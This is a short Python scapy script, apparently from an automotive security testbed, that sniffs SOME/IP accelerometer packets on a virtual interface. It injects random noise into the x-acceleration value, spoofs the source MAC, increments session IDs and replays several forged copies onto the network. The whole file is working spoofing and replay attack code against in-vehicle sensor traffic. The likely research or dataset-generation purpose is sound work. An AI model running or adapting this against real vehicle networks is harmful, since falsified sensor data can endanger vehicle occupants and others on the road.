from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
from common import Replay
import pdb
import time
import struct
import numpy as np

variables = [np.random.normal(0, 3) for _ in range(100)]
index = 0

def process_packet(packet):
    global index
    accel_x, accel_y, accel_z = struct.unpack('>fff', bytes(packet[SOMEIP].payload))

    packets = []
    for _ in range(Replay.packet_series_count):
        accel_x_tempered = accel_x + variables[index]
        index += 1
        if index >= 100:
            index = 0
        data = struct.pack('>fff', accel_x_tempered, accel_y, accel_z)
        packet[SOMEIP].payload = Raw(load=data)
        packet[IP].ttl = 5
        packet[Ether].src = '00:00:00:00:00:08'
        packet[SOMEIP].session_id += 10
        if packet[SOMEIP].session_id >= 65535:
            packet[SOMEIP].session_id = 1
        packet = update_udp_chksum(packet)
        packets.append(packet)
    print(f"[Replay] accel_x_orig({accel_x}), accel_x_temp({accel_x_tempered})")
    sendp(packets, iface='veth0.3', inter=Replay.accel_interval)

filter = "udp and src host 10.0.3.2 and src port 31002"
sniff(filter=filter, iface='veth0.3', prn=process_packet)

